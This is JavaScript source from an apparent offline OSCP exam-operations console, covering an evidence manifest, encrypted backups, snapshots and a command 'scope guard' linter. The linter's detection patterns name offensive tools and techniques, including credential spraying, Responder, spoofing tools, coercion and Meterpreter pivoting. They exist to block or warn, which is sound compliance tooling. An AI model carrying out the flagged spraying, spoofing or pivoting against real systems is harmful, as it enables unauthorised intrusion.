 stats.innerHTML=`<div class="health"><div class="healthBox"><div class="healthNum">${evidenceVault.length}</div><div class="tiny">total files</div></div><div class="healthBox"><div class="healthNum">${items.length}</div><div class="tiny">selected target</div></div><div class="healthBox"><div class="healthNum">${items.filter(x=>x.kind==='local-proof'||x.kind==='proof').length}</div><div class="tiny">proof-class</div></div><div class="healthBox"><div class="healthNum">${bytes(items.reduce((n,x)=>n+x.size,0))}</div><div class="tiny">original file sizes</div></div></div>`;
 body.innerHTML=items.length?items.map(e=>`<tr><td><b>${esc(e.name)}</b><div class="tiny">${new Date(e.addedAt).toLocaleString()}</div></td><td>${esc(targetLabel(targets.find(t=>t.id===e.targetId)))}</td><td><select class="vaultKindEdit" data-eid="${esc(e.id)}">${['enumeration','foothold','local-proof','privesc','proof','pivot','report','other'].map(k=>`<option ${k===e.kind?'selected':''}>${k}</option>`).join('')}</select></td><td>${bytes(e.size)}</td><td class="hash" title="${e.sha256}">${e.sha256.slice(0,18)}…</td><td><input class="vaultFlag" data-k="ipVisible" data-eid="${esc(e.id)}" type="checkbox" ${e.ipVisible?'checked':''}></td><td><input class="vaultFlag" data-k="proofVisible" data-eid="${esc(e.id)}" type="checkbox" ${e.proofVisible?'checked':''}></td><td><input class="vaultFlag" data-k="originalLocation" data-eid="${esc(e.id)}" type="checkbox" ${e.originalLocation?'checked':''}></td><td><input class="vaultNoteEdit" data-eid="${esc(e.id)}" value="${esc(e.note||'')}" placeholder="note"></td><td><button class="btn bad vaultDel" data-eid="${esc(e.id)}">×</button></td></tr>`).join(''):'<tr><td colspan="10" class="muted">No evidence registered for this target.</td></tr>';
 $$('.vaultFlag').forEach(x=>x.onchange=()=>{const e=evidenceVault.find(y=>y.id===x.dataset.eid);e[x.dataset.k]=x.checked;saveVault()});
 $$('.vaultKindEdit').forEach(x=>x.onchange=()=>{const e=evidenceVault.find(y=>y.id===x.dataset.eid);e.kind=x.value;saveVault()});
 $$('.vaultNoteEdit').forEach(x=>x.onchange=()=>{const e=evidenceVault.find(y=>y.id===x.dataset.eid);e.note=x.value;saveVault()});
 $$('.vaultDel').forEach(x=>x.onclick=()=>{if(confirm('Remove this manifest entry? The original file on disk is not touched.')){evidenceVault=evidenceVault.filter(y=>y.id!==x.dataset.eid);saveVault()}});
}
$('#vaultTarget').onchange=()=>renderVault();
$('#vaultFiles').onchange=e=>addVaultFiles([...e.target.files]);
const vaultDrop=$('#vaultDrop');['dragenter','dragover'].forEach(ev=>vaultDrop.addEventListener(ev,e=>{e.preventDefault();vaultDrop.classList.add('drag')}));['dragleave','drop'].forEach(ev=>vaultDrop.addEventListener(ev,e=>{e.preventDefault();vaultDrop.classList.remove('drag')}));vaultDrop.addEventListener('drop',e=>addVaultFiles([...e.dataTransfer.files]));
function vaultManifestMarkdown(targetId=''){
 const items=evidenceVault.filter(x=>!targetId||x.targetId===targetId);
 return `# OSCP Evidence Manifest\n\nGenerated: ${new Date().toISOString()}\n\n`+items.map(e=>`## ${e.name}\n- Target: ${targetLabel(targets.find(t=>t.id===e.targetId))}\n- Kind: ${e.kind}\n- Size: ${e.size} bytes\n- SHA-256: \`${e.sha256}\`\n- IP visible confirmed: ${e.ipVisible?'yes':'no'}\n- Proof visible confirmed: ${e.proofVisible?'yes':'no'}\n- Original-location context confirmed: ${e.originalLocation?'yes':'no'}\n- Note: ${e.note||''}\n`).join('\n');
}
$('#exportVaultManifest').onclick=()=>downloadText('OSCP-evidence-manifest.md',vaultManifestMarkdown(),'text/markdown');

function reportEvidenceHTML(t){
 const items=evidenceVault.filter(e=>e.targetId===t?.id);if(!items.length)return'<div class="muted">No evidence files registered for this target.</div>';
 return items.map(e=>`<div class="favorite"><div><b>${esc(e.name)}</b><div class="tiny">${esc(e.kind)} · SHA-256 ${esc(e.sha256.slice(0,16))}…</div></div><div>${e.ipVisible?'<span class="evidenceBadge ok">IP ✓</span>':'<span class="evidenceBadge miss">IP ?</span>'} ${e.proofVisible?'<span class="evidenceBadge ok">proof ✓</span>':'<span class="evidenceBadge miss">proof ?</span>'}</div></div>`).join('');
}
function renderReportEvidenceManifest(){const root=$('#reportEvidenceManifest'),t=activeTarget();if(root)root.innerHTML=reportEvidenceHTML(t)}
const v9ReportMarkdownBase=reportMarkdown;
reportMarkdown=function(t){
 const base=v9ReportMarkdownBase(t),items=evidenceVault.filter(e=>e.targetId===t.id);
 if(!items.length)return base;
 return base+`\n\n## Evidence File Manifest\n\n${items.map(e=>`- **${e.name}** — ${e.kind} — SHA-256 \`${e.sha256}\` — IP visible: ${e.ipVisible?'yes':'no'} — proof visible: ${e.proofVisible?'yes':'no'} — note: ${e.note||''}`).join('\n')}\n`;
}
const v9RenderReportBase=renderReport;
renderReport=function(){v9RenderReportBase();renderReportEvidenceManifest()};

/* Session payload extension + restore */
const v9SessionPayloadBase=sessionPayload;
sessionPayload=function(includeSecrets=false){
 boardConfig={...boardConfig,passTarget:OSCP_PASS_TARGET};const o=v9SessionPayloadBase(includeSecrets);o.app='OSCP-V9';o.version=9;o.boardConfig=boardConfig;o.evidenceVault=evidenceVault;return o;
}
function clearSessionSecretsForRestore(){sessionSecrets={};sessionCredentialSecrets={}}
function restoreV9Payload(o){
 if(!o||!Array.isArray(o.targets))throw new Error('targets missing');
 targets=o.targets.map(t=>upgradeV8Target(upgradeTarget(t)));
 credentials=Array.isArray(o.credentials)?o.credentials.map(c=>({...c,checks:c.checks||{}})):[];
 favorites=Array.isArray(o.favorites)?o.favorites:[];
 evidenceVault=Array.isArray(o.evidenceVault)?o.evidenceVault:[];
 if(o.boardConfig)boardConfig=o.boardConfig;
 if(o.settings)settings={...settings,...o.settings,PASSWORD:o.settings.PASSWORD||''};
 preflightData=o.preflight||null;
 activeTargetId=o.activeTargetId&&targets.some(t=>t.id===o.activeTargetId)?o.activeTargetId:(targets[0]?.id||'');
 // A restore is a state replacement, not a merge. Clear session-only secret maps first
 // so secret-free snapshots/imports cannot inherit stale credentials from old IDs.
 clearSessionSecretsForRestore();
 targets.forEach(t=>{if(t.creds)sessionSecrets[t.id]=t.creds;if(!persistSecrets)t.creds=''});
 credentials.forEach(c=>{if(c.secret)sessionCredentialSecrets[c.id]=c.secret;if(!persistSecrets)c.secret=''});
 safeStoreSet(STORE+'boardConfig',JSON.stringify(boardConfig));
 saveTargets();saveOps();saveVault();renderSettings();renderPlaceholders();prepareCode();renderAllV9();
}
/* Normal session import is validated before mutation and restored through the current restore chain. */

/* AES-GCM encrypted backups */
function b64(bytes){let s='';for(const b of bytes)s+=String.fromCharCode(b);return btoa(s)}
function unb64(s){const raw=atob(s);return Uint8Array.from(raw,c=>c.charCodeAt(0))}
const MAX_IMPORT_FILE_BYTES=50_000_000;
const MAX_TEXT_INTAKE_CHARS=10_000_000;
const MAX_ENCRYPTED_PAYLOAD_BYTES=40_000_000;
function assertImportFileSize(file,label='backup'){
 if(!file||!Number.isFinite(+file.size))return true;
 if(+file.size>MAX_IMPORT_FILE_BYTES)throw new Error(`${label} is too large (${Math.ceil(+file.size/1_000_000)} MB). Refuse files over ${MAX_IMPORT_FILE_BYTES/1_000_000} MB to protect this offline console.`);
 return true;
}
function decodeBackupB64(value,label,exactLength=0,maxLength=MAX_ENCRYPTED_PAYLOAD_BYTES){
 if(typeof value!=='string'||!value.length)throw new Error(`${label} is missing`);
 if(value.length>Math.ceil(maxLength*4/3)+8)throw new Error(`${label} is too large`);
 if(value.length%4!==0||!/^[A-Za-z0-9+/]*={0,2}$/.test(value))throw new Error(`${label} is not valid base64`);
 let bytes;try{bytes=unb64(value)}catch(_){throw new Error(`${label} is not valid base64`)}
 if(exactLength&&bytes.length!==exactLength)throw new Error(`${label} must decode to ${exactLength} bytes`);
 if(bytes.length>maxLength)throw new Error(`${label} exceeds the safe size limit`);
 return bytes;
}
function validateEncryptedContainer(container){
 if(!container||typeof container!=='object'||Array.isArray(container))throw new Error('Encrypted backup container must be an object');
 if(container.format!=='OSCP-V10-AESGCM')throw new Error('Unsupported OSCP encrypted backup format');
 if(container.kdf!==undefined&&container.kdf!=='PBKDF2-SHA256')throw new Error('Unsupported encrypted-backup KDF');
 if(container.version!==undefined&&+container.version!==1)throw new Error('Unsupported encrypted-backup container version');
 const iterations=Number(container.iterations);if(!Number.isInteger(iterations)||iterations<100_000||iterations>1_000_000)throw new Error('Encrypted-backup PBKDF2 iterations must be between 100000 and 1000000');
 const salt=decodeBackupB64(container.salt,'Encrypted-backup salt',16,16),iv=decodeBackupB64(container.iv,'Encrypted-backup IV',12,12),cipher=decodeBackupB64(container.ciphertext,'Encrypted-backup ciphertext',0,MAX_ENCRYPTED_PAYLOAD_BYTES);
 if(cipher.length<16)throw new Error('Encrypted-backup ciphertext is too short');
 return{iterations,salt,iv,cipher};
}
function requireBackupCrypto(){if(!globalThis.crypto?.subtle||typeof crypto.getRandomValues!=='function')throw new Error('Encrypted backups require Web Crypto. Open this offline file in a modern browser context that supports Web Crypto.');return true}
async function deriveBackupKey(pass,salt,iterations=250000){
 requireBackupCrypto();const material=await crypto.subtle.importKey('raw',new TextEncoder().encode(pass),'PBKDF2',false,['deriveKey']);
 return crypto.subtle.deriveKey({name:'PBKDF2',salt,iterations,hash:'SHA-256'},material,{name:'AES-GCM',length:256},false,['encrypt','decrypt']);
}
async function encryptPayload(obj,pass){
 requireBackupCrypto();const salt=crypto.getRandomValues(new Uint8Array(16)),iv=crypto.getRandomValues(new Uint8Array(12)),iterations=250000,key=await deriveBackupKey(pass,salt,iterations);
 const clear=new TextEncoder().encode(JSON.stringify(obj));if(clear.length>MAX_ENCRYPTED_PAYLOAD_BYTES)throw new Error('Session is too large for a safe encrypted browser backup');
 const cipher=new Uint8Array(await crypto.subtle.encrypt({name:'AES-GCM',iv},key,clear));
 return {format:'OSCP-V10-AESGCM',version:1,kdf:'PBKDF2-SHA256',iterations,salt:b64(salt),iv:b64(iv),ciphertext:b64(cipher),created:new Date().toISOString()};
}
async function decryptPayload(container,pass){
 const checked=validateEncryptedContainer(container),key=await deriveBackupKey(pass,checked.salt,checked.iterations);
 const clear=await crypto.subtle.decrypt({name:'AES-GCM',iv:checked.iv},key,checked.cipher);
 if(clear.byteLength>MAX_ENCRYPTED_PAYLOAD_BYTES)throw new Error('Decrypted backup exceeds the safe size limit');
 return JSON.parse(new TextDecoder().decode(clear));
}
$('#exportEncrypted').onclick=async()=>{
 const pass=$('#encPassphrase').value;if(pass.length<8){alert('Use a passphrase of at least 8 characters.');return}
 try{const obj=await encryptPayload(sessionPayload($('#encIncludeSecrets').checked),pass);downloadText('oscp-encrypted-backup.json',JSON.stringify(obj,null,2),'application/json');toast('Encrypted backup exported')}catch(e){alert('Encryption failed: '+e.message)}
};
$('#importEncrypted').onchange=async e=>{
 const file=e.target.files[0],pass=$('#encPassphrase').value;if(!file)return;if(!pass){alert('Enter the backup passphrase first.');e.target.value='';return}
 try{assertImportFileSize(file,'Encrypted backup');const obj=assertRestorableBackup(await decryptPayload(JSON.parse(await file.text()),pass));snapshotNow('before encrypted restore');restoreV9Payload(obj);toast('Encrypted backup restored')}catch(err){alert('Unable to decrypt/restore: '+err.message)}finally{e.target.value=''}
};

/* Secret-free autosnapshots */
function snapshotPayload(){
 const o=sessionPayload(false);o.preflight=null;return o;
}
function snapshotNow(reason='manual'){
 try{
  const snap={id:Date.now()+'-'+Math.random().toString(16).slice(2),at:Date.now(),reason,payload:snapshotPayload()};
  let next=[snap,...autosnapshots].slice(0,8),saved=false;while(next.length&&!saved){saved=safeStoreSet(STORE+'autosnapshots',JSON.stringify(next));if(!saved)next.pop()}if(!saved)throw new Error('storage write failed');autosnapshots=next;lastSnapshotAt=snap.at;safeStoreSet(STORE+'lastSnapshotAt',String(lastSnapshotAt));v9Dirty=false;renderSnapshots();renderCockpitRecovery();if(next.length<8)toast(`Restore point saved; retained ${next.length} snapshot${next.length===1?'':'s'} due to storage pressure`);return true;
 }catch(e){toast('Autosnapshot failed — browser storage may be full');return false}
}
function renderSnapshots(){
 const root=$('#snapshotList');if(!root)return;root.innerHTML=autosnapshots.length?autosnapshots.map(s=>`<div class="snapshot"><div class="row" style="justify-content:space-between"><div><div class="snapshotTitle">${new Date(s.at).toLocaleString()}</div><div class="snapshotMeta">${esc(s.reason)} · ${(s.payload.targets||[]).length} targets · ${(s.payload.credentials||[]).length} credentials · dedicated secrets excluded</div></div><div><button class="btn snapRestore" data-sid="${esc(s.id)}">Restore</button><button class="btn bad snapDelete" data-sid="${esc(s.id)}" title="Delete recovery snapshot">Delete</button></div></div></div>`).join(''):'<div class="muted">No autosnapshots yet.</div>';
 $$('.snapRestore').forEach(b=>b.onclick=()=>{const s=autosnapshots.find(x=>x.id===b.dataset.sid);if(s&&confirm('Restore this secret-field-free snapshot? Current state will be replaced.')){try{assertRestorableBackup(s.payload);snapshotNow('before snapshot restore');restoreV9Payload(s.payload);toast('Snapshot restored')}catch(err){alert('Snapshot restore blocked: '+err.message)}}});
 $('.snapDelete').forEach(b=>b.onclick=()=>{const s=autosnapshots.find(x=>x.id===b.dataset.sid);if(!s||!confirm('Delete this recovery snapshot? This cannot be undone.'))return;autosnapshots=autosnapshots.filter(x=>x.id!==b.dataset.sid);safeStoreSet(STORE+'autosnapshots',JSON.stringify(autosnapshots));renderSnapshots();renderCockpitRecovery()});
}
function renderCockpitRecovery(){const r=$('#cockpitRecovery');if(!r)return;r.innerHTML=lastSnapshotAt?`Last secret-field-free restore point: <b>${new Date(lastSnapshotAt).toLocaleString()}</b><br><span class="tiny">${autosnapshots.length} restore point(s) retained.</span>`:'No restore point created yet.'}
$('#manualSnapshot').onclick=()=>{snapshotNow('manual');toast('Restore point created')};
$('#cockpitSnapshotNow').onclick=()=>{snapshotNow('cockpit');toast('Restore point created')};

/* Mark dirty when V9 state changes without snapshotting every keystroke. */
const v9SaveTargetsBase=saveTargets;
saveTargets=function(){v9SaveTargetsBase();v9Dirty=true};
const v9SaveOpsBase=saveOps;
saveOps=function(){v9SaveOpsBase();v9Dirty=true};

setInterval(()=>{if(v9Dirty&&Date.now()-lastSnapshotAt>5*60*1000)snapshotNow('5-minute autosave')},60*1000);
document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='hidden'&&v9Dirty&&Date.now()-lastSnapshotAt>2*60*1000)snapshotNow('page hidden')});
window.addEventListener('beforeunload',()=>{if(v9Dirty&&Date.now()-lastSnapshotAt>2*60*1000)snapshotNow('before unload')});

/* Session health */
function sessionHealthData(){
 const ids=new Set(targets.map(t=>t.id)),dupeTargets=targets.length-ids.size,orphCred=credentials.filter(c=>c.sourceTarget&&!ids.has(c.sourceTarget)).length,orphEv=evidenceVault.filter(e=>e.targetId&&!ids.has(e.targetId)).length,noIp=targets.filter(t=>!t.ip).length;
 return {dupeTargets,orphCred,orphEv,noIp};
}
function renderSessionHealth(){
 const root=$('#sessionHealth');if(!root)return;const h=sessionHealthData(),issues=h.dupeTargets+h.orphCred+h.orphEv+h.noIp;
 root.innerHTML=`<div class="healthBox"><div class="healthNum">${targets.length}</div><div class="tiny">targets</div></div><div class="healthBox"><div class="healthNum">${credentials.length}</div><div class="tiny">credential records</div></div><div class="healthBox"><div class="healthNum">${evidenceVault.length}</div><div class="tiny">evidence manifest entries</div></div><div class="healthBox"><div class="healthNum">${issues}</div><div class="tiny">data-health issue(s)</div></div>`;
 if(issues)root.innerHTML+=`<div class="opsSpan12 muted">Issues: duplicate target IDs ${h.dupeTargets}; orphan credentials ${h.orphCred}; orphan evidence ${h.orphEv}; targets without IP ${h.noIp}.</div>`;
}

/* V8 -> V9 migration */
if(!targets.length){
 try{
  const oldTargets=JSON.parse(localStorage.getItem('oscp_v8_targets')||'[]');
  if(Array.isArray(oldTargets)&&oldTargets.length){
   targets=oldTargets.map(t=>upgradeV8Target(upgradeTarget(t)));
   const oldCred=JSON.parse(localStorage.getItem('oscp_v8_credentials')||'[]'),oldFav=JSON.parse(localStorage.getItem('oscp_v8_favorites')||'[]'),oldPre=JSON.parse(localStorage.getItem('oscp_v8_preflight')||'null'),oldBoard=JSON.parse(localStorage.getItem('oscp_v8_boardConfig')||'null');
   if(Array.isArray(oldCred))credentials=oldCred;if(Array.isArray(oldFav))favorites=oldFav;if(oldPre)preflightData=oldPre;if(oldBoard)boardConfig=oldBoard;
   const oldActive=localStorage.getItem('oscp_v8_activeTarget');activeTargetId=oldActive&&targets.some(t=>t.id===oldActive)?oldActive:targets[0].id;
   targets.forEach(t=>{if(t.creds)sessionSecrets[t.id]=t.creds;if(!persistSecrets)t.creds=''});
   credentials.forEach(c=>{if(c.secret)sessionCredentialSecrets[c.id]=c.secret;if(!persistSecrets)c.secret=''});
   v9SaveTargetsBase();v9SaveOpsBase();safeStoreSet(STORE+'boardConfig',JSON.stringify(boardConfig));
   toast('Legacy operations state migrated');
  }
 }catch(e){}
}

function renderAllV9(){
 renderAllV8();renderAnalyzerTarget();renderAnalyzer();renderVaultSelectors();renderVault();renderReportEvidenceManifest();renderSnapshots();renderCockpitRecovery();renderSessionHealth();
}
const v9SwitchView=switchView;
switchView=function(id){v9SwitchView(id);if(id==='analyzerView'){renderAnalyzerTarget();renderAnalyzer()}if(id==='vaultView'){renderVaultSelectors();renderVault()}if(id==='sessionView'){renderSnapshots();renderSessionHealth()}};



renderAllV9();

renderAllV8();

/* ===== V10 Scope Guard / Command Journal ===== */
let guardConfig=safeStoredRecord(STORE+'guardConfig',{entries:[],requireScope:true,checkPlaceholders:true,lhost:'',msfTargetId:''});
function normalizeGuardConfig(v){v=plainRecord(v)?v:{};return{entries:Array.isArray(v.entries)?v.entries.map(x=>String(x??'').trim()).filter(Boolean):[],requireScope:v.requireScope!==false,checkPlaceholders:v.checkPlaceholders!==false,lhost:typeof v.lhost==='string'?v.lhost:'',msfTargetId:typeof v.msfTargetId==='string'?v.msfTargetId:''}}
guardConfig=normalizeGuardConfig(guardConfig);
let journalPreview=[];const RULE_VERIFIED_DATE='2026-09-23';
function upgradeV10Target(t){t=upgradeV8Target(upgradeTarget(t));t.journal=Array.isArray(t.journal)?t.journal:[];return t}targets=targets.map(upgradeV10Target);const v10NewTargetBase=newTarget;newTarget=function(){return upgradeV10Target(v10NewTargetBase())};

/* Prefer V9 state on first V10 launch. */
if(!targets.length){try{const old=JSON.parse(localStorage.getItem('oscp_v9_targets')||'[]');if(Array.isArray(old)&&old.length){targets=old.map(upgradeV10Target);const c=JSON.parse(localStorage.getItem('oscp_v9_credentials')||'[]'),f=JSON.parse(localStorage.getItem('oscp_v9_favorites')||'[]'),pr=JSON.parse(localStorage.getItem('oscp_v9_preflight')||'null'),bc=JSON.parse(localStorage.getItem('oscp_v9_boardConfig')||'null'),ev=JSON.parse(localStorage.getItem('oscp_v9_evidenceVault')||'[]');if(Array.isArray(c))credentials=c;if(Array.isArray(f))favorites=f;if(pr)preflightData=pr;if(bc)boardConfig=bc;if(Array.isArray(ev))evidenceVault=ev;const a=localStorage.getItem('oscp_v9_activeTarget');activeTargetId=a&&targets.some(t=>t.id===a)?a:targets[0].id;targets.forEach(t=>{if(t.creds)sessionSecrets[t.id]=t.creds;if(!persistSecrets)t.creds='' });credentials.forEach(x=>{if(x.secret)sessionCredentialSecrets[x.id]=x.secret;if(!persistSecrets)x.secret='' });v9SaveTargetsBase();v9SaveOpsBase();safeStoreSet(STORE+'boardConfig',JSON.stringify(boardConfig));safeStoreSet(STORE+'evidenceVault',JSON.stringify(evidenceVault));toast('Legacy operations state migrated into current schema')}}catch(e){}}

function parseIPv4(s){const a=s.split('.').map(Number);return a.length===4&&a.every(x=>Number.isInteger(x)&&x>=0&&x<=255)?a:null}function ipToInt(ip){const a=parseIPv4(ip);if(!a)return null;return (((a[0]<<24)>>>0)+(a[1]<<16)+(a[2]<<8)+a[3])>>>0}function ipInCidr(ip,cidr){const [base,bitsRaw]=cidr.split('/'),bits=+bitsRaw;if(!parseIPv4(ip)||!parseIPv4(base)||!Number.isInteger(bits)||bits<0||bits>32)return false;const mask=bits===0?0:(0xffffffff<<(32-bits))>>>0;return((ipToInt(ip)&mask)>>>0)===((ipToInt(base)&mask)>>>0)}
function normalizedScope(){return(Array.isArray(guardConfig?.entries)?guardConfig.entries:[]).map(x=>String(x??'').trim()).filter(Boolean)}
function scopeEntryMatches(host){host=(host||'').replace(/^\[|\]$/g,'').toLowerCase();if(!host)return true;return normalizedScope().some(e=>{const x=e.toLowerCase();if(x.includes('/')&&parseIPv4(host))return ipInCidr(host,x);if(x===host)return true;if(x.startsWith('*.')&&host.endsWith(x.slice(1)))return true;return false})}
function isLocalCommandAddress(host){host=String(host||'').replace(/^\[|\]$/g,'').toLowerCase();if(!host)return false;if(['0.0.0.0','::','::1','localhost','240.0.0.1'].includes(host))return true;const ip=parseIPv4(host);return !!(ip&&ip[0]===127)}
function hostInScope(host){host=(host||'').replace(/^\[|\]$/g,'').toLowerCase();if(!host||scopeEntryMatches(host))return true;const alias=targets.find(t=>String(t?.host||'').trim().toLowerCase()===host);return !!(alias?.ip&&scopeEntryMatches(String(alias.ip).trim()))}
function extractCommandHosts(cmd){const ips=[...cmd.matchAll(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g)].map(m=>m[0]).filter(parseIPv4),urls=[...cmd.matchAll(/https?:\/\/([^\/:\s'\"]+)/gi)].map(m=>m[1]),ssh=[...cmd.matchAll(/\b(?:ssh|scp|sftp)\s+(?:-[^\s]+\s+)*(?:[^@\s]+@)?([a-z0-9._-]+\.[a-z0-9._-]+|(?:\d{1,3}\.){3}\d{1,3})/gi)].map(m=>m[1]);return[...new Set([...ips,...urls,...ssh])]}
function unresolvedTokens(cmd){const pats=[/\$TARGET\b/gi,/\$IP\b/gi,/\$RHOST\b/gi,/\$LHOST\b/gi,/\$LPORT\b/gi,/\$TARGET_URL\b/gi,/\$LDAP_URI\b/gi,/\$MSSQL_TARGET\b/gi,/\$SSH_TARGET\b/gi,/\$IMPACKET_TARGET\b/gi,/\$DOMAIN\b/gi,/\$DC_IP\b/gi,/\$BASE_DN\b/gi,/\$DC\b/gi,/\$AUTH_USER\b/gi,/\$AUTH_PASS\b/gi,/\$TARGET_HOST\b/gi,/\$EDGE_TARGET\b/gi,/\$CONTROLLED_PRINCIPAL\b/gi,/\$CONTROLLED_COMPUTER\b/gi,/\$SCOPE_CIDR\b/gi,/\$USER\b/gi,/<OPEN_PORTS>/gi,/<TARGET>/gi,/<IP>/gi,/\{U\}/g,/\{P\}/g,/\bPASSWORD\b/g,/\bUSERNAME\b/g,/\bDC_IP\b/g,/\bDOMAIN\b/g,/\bUSER\b/g,/DC=domain,DC=local/gi,/\bdomain\.local\b/gi,/\bLHOST\b(?!\s*=)/g,/\bLPORT\b(?!\s*=)/g];const out=[];pats.forEach(r=>{const m=cmd.match(r);if(m)out.push(...m)});return[...new Set(out)]}
function explicitLhosts(cmd){const out=[];for(const m of cmd.matchAll(/\bLHOST\s*=\s*((?:\d{1,3}\.){3}\d{1,3})/gi))out.push(m[1]);return[...new Set(out)].filter(parseIPv4)}
function lintCommand(cmd){const issues=[],add=(sev,title,why,code)=>issues.push({sev,title,why,code}),low=cmd.toLowerCase(),hosts=extractCommandHosts(cmd);if(guardConfig.checkPlaceholders){const toks=unresolvedTokens(cmd);if(toks.length)add('block','Unresolved placeholder(s)',toks.join(', ')+' still appear in the command.','placeholder')}if(guardConfig.requireScope&&normalizedScope().length){const outside=hosts.filter(h=>h!==guardConfig.lhost&&!isLocalCommandAddress(h)&&!hostInScope(h));if(outside.length)add('block','Explicit destination outside configured scope',outside.join(', '),'scope')}if(guardConfig.lhost){const ls=explicitLhosts(cmd).filter(x=>x!==guardConfig.lhost);if(ls.length)add('warn','LHOST differs from configured callback',`Configured ${guardConfig.lhost}; command contains ${ls.join(', ')}.`,'lhost')}
 if(/\bsqlmap\b|\bsqlninja\b/.test(low))add('block','Automatic exploitation tool detected','Current OSCP+ guide explicitly prohibits SQLmap/SQLninja-style automatic exploitation.','rule-auto');
 if(/\b(nessus|openvas|nexpose|core impact|saint)\b/.test(low))add('block','Mass vulnerability scanner detected','Current OSCP+ guide prohibits mass vulnerability scanners.','rule-scan');
 if(/\b(chatgpt|deepseek|gemini|ollama|openai\s+api|llm\s+chat)\b/.test(low))add('block','AI/LLM usage reference detected','AI/LLM chatbots are prohibited during the exam and reporting phase.','rule-ai');
 if(/\bresponder\b/.test(low))add('warn','Responder is rule-sensitive','Responder is an allowed example, but poisoning/spoofing is prohibited. Verify this invocation does not perform those actions.','rule-responder'); if(/\bkerbrute\b/.test(low))add('warn','Kerbrute is lockout-sensitive','Validate only an evidence-derived user/password hypothesis after reviewing account lockout policy; avoid uncontrolled spraying.','rule-kerbrute');
 if(/\b(?:hydra|medusa)\b/.test(low))add('warn','Online guessing is lockout-sensitive','Use only a small evidence-derived shortlist after reviewing lockout/rate-limit behavior; stop on instability or unexpected failures.','rule-online-guess');
 if(/\b(?:nxc|netexec|crackmapexec)\b[^\n]*(?:-u|--username)\s+(?:users?\.txt|\$USERS)\b[^\n]*(?:-p|--password)\s+(?:passwords?\.txt|\$SHORTLIST|\$PASS(?:WORDS)?)\b/i.test(cmd)||/\bkerbrute\b[^\n]*(?:passwordspray|bruteuser|bruteforce)\b/i.test(cmd))add('warn','Credential spraying/list auth detected','Use only an evidence-derived tiny set after checking lockout/rate-limit behavior. Prefer recovered credential reuse and one-host validation first.','rule-spray');
 if(/\b(?:coercer|petitpotam)\b/.test(low))add('warn','Coercion/relay workflow is rule-sensitive','Use only for an exact hypothesis after reviewing the current exam rules; never combine it with prohibited spoofing/poisoning.','rule-coercion');
 if(/\b(nuclei)\b/.test(low))add('warn','Scanner automation is rule-sensitive','OffSec prohibits mass vulnerability scanners and automatic exploitation. Verify this exact use is manual/non-prohibited under the current guide.','rule-nuclei');
 if(/\b(burp\s*pro|burpsuite[_ -]?pro|metasploit\s+pro|cobalt\s*strike)\b/.test(low))add('block','Commercial offensive tooling reference detected','Current OSCP+ restrictions prohibit covered commercial offensive tools/services.','rule-commercial');
 if(/\b(arpspoof|dnsspoof|ettercap)\b|\b(?:arp|dns|nbns|ip)\s+spoof/.test(low))add('block','Spoofing/poisoning pattern detected','IP/ARP/DNS/NBNS spoofing is prohibited by the current guide.','rule-spoof');
 const msfRestricted=/\bmsfconsole\b|\bmeterpreter\b|\buse\s+(?:exploit|auxiliary|post)\//.test(low),msfPivot=/\b(?:autoroute|socks_proxy|portfwd)\b|\broute\s+add\b/.test(low)&&/\b(?:meterpreter|msfconsole|use\s+)\b/.test(low);if(msfPivot)add('block','Metasploit pivoting pattern detected','Current OSCP+ FAQ says Metasploit cannot be used for pivoting.','rule-msf-pivot');if(msfRestricted){const selected=targets.find(t=>t.id===guardConfig.msfTargetId);if(!selected)add('warn','Restricted Metasploit functionality without selected target','Configure the one target committed for restricted Metasploit/Meterpreter usage.','rule-msf-target');else{const bad=hosts.filter(parseIPv4).filter(ip=>ip!==selected.ip&&ip!==guardConfig.lhost);if(bad.length)add('block','Restricted Metasploit command references a different target',`Selected target ${selected.ip||targetLabel(selected)}; command references ${bad.join(', ')}.`,'rule-msf-target');else add('info','Restricted Metasploit target configured',`Selected target: ${selected.ip||targetLabel(selected)}. The current guide notes that use of check commits the selected target.`,'rule-msf-info')}}if(!issues.length)add('good','No configured guard issue detected','This is deterministic linting only; still verify scope, prerequisites and the current official guide.','ok');return{issues,hosts}}
function guardIssuesHTML(r){return r.issues.map(i=>`<div class="guardIssue ${i.sev}"><div class="row" style="justify-content:space-between"><b>${esc(i.title)}</b><span class="guardSev">${esc(i.sev)}</span></div><div class="tiny" style="margin-top:5px">${esc(i.why)}</div></div>`).join('')}
async function guardedCopyText(text,label='Command',inlineEl=null,opts={}){text=String(text||'');const base=lintCommand(text);let issues=base.issues.map(i=>({...i}));if(opts.allowPlaceholders){issues=issues.map(i=>i.code==='placeholder'?{...i,sev:'warn',title:'Template placeholder(s) remain',why:i.why+' Edit/replace them before execution.'}:i)}const result={...base,issues};if(inlineEl)inlineEl.innerHTML=guardIssuesHTML(result);const blockers=issues.filter(i=>i.sev==='block');if(blockers.length){toast(`${label} copy blocked — ${blockers.map(i=>i.title).join(' · ')}`);return false}const warnings=issues.filter(i=>i.sev==='warn');if(warnings.length){const ok=confirm('Guard warning(s):\n\n'+warnings.map(i=>'• '+i.title+': '+i.why).join('\n')+'\n\nCopy anyway?');if(!ok){toast(`${label} copy cancelled — review guard warnings`);return false}}const ok=await copyText(text);toast(ok?`${label} copied after guard`:`${label} copy blocked by browser`);return ok}
function renderGuard(){if(!$('#scopeEntries'))return;$('#scopeEntries').value=normalizedScope().join('\n');$('#guardRequireScope').checked=guardConfig.requireScope!==false;$('#guardPlaceholder').checked=guardConfig.checkPlaceholders!==false;$('#guardLhost').value=guardConfig.lhost||'';const s=$('#guardMsfTarget');s.innerHTML='<option value="">Not selected / not using restricted Metasploit</option>'+targets.map(t=>`<option value="${esc(t.id)}">${esc(targetLabel(t))}</option>`).join('');s.value=guardConfig.msfTargetId||'';const e=normalizedScope();$('#scopeResolved').innerHTML=e.length?e.map(x=>`<span class="scopePill">${esc(x)}</span>`).join(''):'No scope configured.';renderCockpitGuard()}
